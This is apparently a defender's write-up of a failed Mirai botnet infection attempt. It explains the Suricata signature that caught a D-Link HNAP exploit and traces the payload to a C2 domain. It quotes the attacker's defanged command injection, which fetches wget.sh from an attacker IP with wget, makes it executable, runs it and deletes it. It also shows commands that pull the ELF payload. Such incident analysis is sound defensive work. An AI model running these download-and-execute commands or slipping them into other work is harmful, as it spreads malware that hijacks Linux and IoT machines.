# Attempted Mirai Infection and Analysis
---

## The Attack

- This began with a "drive by" infection attempt aiming to exploit a D-Link Router vulnerability CVE-2020-15631. Thank fully this bot attack didn't find a D-Link Router and instead found a fully patched web server. The attack failed.  Breaking the initial vulnerability and exploit attempt down is beyond the scope of this project but I will give a brief overview. 
    - This website has some great analysis on this vulnerability:
        - https://musteresel.github.io/posts/2018/03/exploit-hnap-security-flaw-dlink-dir-615.html

### Suricata Alert

- The Rule that fired was the following:
 ```
	alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET WEB_SERVER Possible D-Link Router HNAP Protocol Security Bypass Attempt"; flow:established,to_server; urilen:7; http.method; content:"POST"; http.uri; content:"/HNAP1/"; nocase; endswith; fast_pattern; http.header; content:"SOAPAction|3a 20|"; nocase; content:"/HNAP1/"; distance:0; pcre:"/^(?:set|get)/Ri"; content:"DeviceSettings"; within:14; reference:url,www.securityfocus.com/bid/37690; reference:url,doc.emergingthreats.net/2010698; classtype:web-application-attack; sid:2010698; rev:6; metadata:created_at 2010_07_30, updated_at 2020_11_02;)
```
- Lets break this Suricata signature down.
    1. The rule is an "alert" rule looking at http traffic from any port inbound from the variable EXTERNAL_NET to the networks assigned to the variable HOME_NET on any port.
    2.  The flow is set to established which means it will only match on established connections. Direction is "to server." 
    3. We see the "urilen" which sets a uri length of 7 characters. 
    4. We then see a sticky buffer of "http.method" which modifies the content "POST" which come after it. That is telling the logic to look in the http.method field for content of "POST." If the http.method field has a GET or any method other then POST, the logic won't continue to run and the rule won't fire. 
    5. We then see another sticky buffer of "http.uri." Again, this is giving a field for which to look for the content that follows it. In this case its saying look in the "http.uri" field for the content "/HNAP1/". You will notice that their is 7 characters in "/HNAP1/"
   6. We see "nocase" which sounds exactly what it does - makes it not case sensitive.
   7. Next is endswith, which according to the suricata manual it "modifies the content to match exactly at the end of a buffer."
   8.  "fast pattern" is fairly complicated and takes some time to explain. I suggest consorting with the suricata manual if you are interested in what this does. 
   9. We then see "http.header" sticky buffer which says " look at the http.header for the following content "SOAPAction|3a 20|" 
      - notice the |3a 20| . If you put that in cyber chef and decode from hex to ASCII you will notice it translates to the character ":" this is a special character and must be translate to hex in the rule or it will mess up the logic. This is trying to look for "SOAPaction:"
   10. We see another content which again is modified by the preceding http.header sticky buffer. This content is looking for "/HNAP1/.
   11. "distance: 0" is telling the logic to look for the preceding content of /HNAP1/ 0 bits away from the content before /HNAP1/ which in this case is SOAPaction:
     - the Suricata manual has a great picture that explains this concept
![image.png](/.attachments/image-532e61cd-c386-43e3-88e5-dcbf6874e550.png)
    

12.  We then see some pcre regex essentially looking for either "set" or "get" pcre:"/^(?:set|get)/Ri"
13. Right after the PCRE we see another content match looking for "DeviceSettings" This is followed by a distance modifier of "within: 14. This is best explained with another picture
![image.png](/.attachments/image-c6c457e7-6c99-49f2-9ec6-97adf0a4f158.png)

13. Thats it for the logic of the rule. Following the logic we have some reference links, the classtype(which signifies which kind of attack it is),  Signature ID(SID), the revision number, and some metadata which tells us when it was created or modified. 
### The Traffic it matched on

![image.png](/.attachments/image-e052bfb3-7be3-4d92-9713-607756a2e185.png)

- As we can see we have a POST as the HTTP Method
- We have /HNAP1/ as the URI
- We have an HTTP header of SOAPaction: with  /HNAP1/ in the header.
- Immediately following /HNAP1/ we have "Get" which the regex will match on and then "DeviceSettings"
- Following DeviceSettings we have the contents of the exploit payload which can change depending on what the threat actor is going to do. 

### The Initial Exploit
Defanged!
```
cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://23.94.22[.]13/a/wget.sh;chmod 777 wget.sh;sh wget.sh selfrep.dlink;rm -rf wget.sh`"
```
This looks like a rather simple command injection.
- It does a CD (change directory) and if that executes with no errors it changes directory to the tmp directory.
- Then adds the current path to the PATH variable
- We see a CD to the /tmp directory where it then uses the wget tool to pull down a script titled "wget.sh" from http://23.94.22[.]13/a/wget.sh
- It then changed the permissions on the wget.sh script to 777 or rwxrwxrwx 
- We then see it use sh to execute wget.sh and it follows it all up by deleting itself. 


### Whats in wget.sh?

- To find this out we need to fire up a VM (behind a VPN) and wget this wget.sh script from the attacker webserver. 
    - To that end we can just run the same command (defanged of course)
    - Becareful from here on out. The ELF we eventually will grab can infect linux machines. Only  do this on a machine you can blow up and walk away from or reset. 
```
wget http://23.94.22[.]13/a/wget.sh
```
- Once we have wget.sh we can the cat the contents. 

![wget_sh.png](/.attachments/wget_sh-de81ca11-748b-49d0-ba8f-dc57f28ea875.png)

- Gnarly. Whats this thing trying to do? its rather simple. Its using wget to pull down the secondary payload, changing the permissions on it and executing it. It doesn't know the operating CPU so its trying from ARM to x86_64. It tries to install them all. 

### Whats the secondary payload?

- Lets find out by utilizing wget to pull it down

```
wget http://23.94.22[.]13/x86_64
```
- After we got that payload we can do a few things. 
    - We can start of by running the command "file" to get some details
![image.png](/.attachments/image-d7ca65f2-b5c8-4498-bd9b-6c3902f35225.png)

- Then lets run the "strings" command and see what we can find
    - If we look through all the strings we can see bots.infectedfam[.]cc This looks like potentially C2 domain. We should check that out later. 
![bots_infectedfam_cc_post.png](/.attachments/bots_infectedfam_cc_post-1e7ce95d-55de-4b0d-92dc-69b9b2f2ba99.png)

### Follow Up Analysis

- At this point, We've collected a handful of IoC's. We have IP addresses(both from the original attack and the ones contained in the exploits). We have a domain. We also have some pretty unique strings we may be able to write a YARA rule with down the road.  
- Lets investigate that domain. 
    - Just days old. Also proxied through Cloudflare. - Smart. Don't exactly want to block Cloudflare IP. Can still block that domain though!
![image.png](/.attachments/image-ab391949-b696-432f-842f-a97e0dac6ea4.png)

- Next we can share this intel with the community by submitting our IoC's as a pulse on AlienVault OTX. I've done so. First Pulse for this domain!
https://otx.alienvault.com/pulse/6215c927cbce007580b75c5e

- I also submitted that ELF to Joes Sandbox for further analysis. You can find the report here:
https://www.joesandbox.com/analysis/576941/0/html

### What I'll be doing now.

- GHIDRA - I'm no programmer or reverse engineer but I'd like to get an even deeper understanding of how this Mirai flavor is working. 
- Yara rules for detection. 

![Ghidra.png](/.attachments/Ghidra-1beaa57c-010a-4612-b0c4-46c43b4d57fe.png)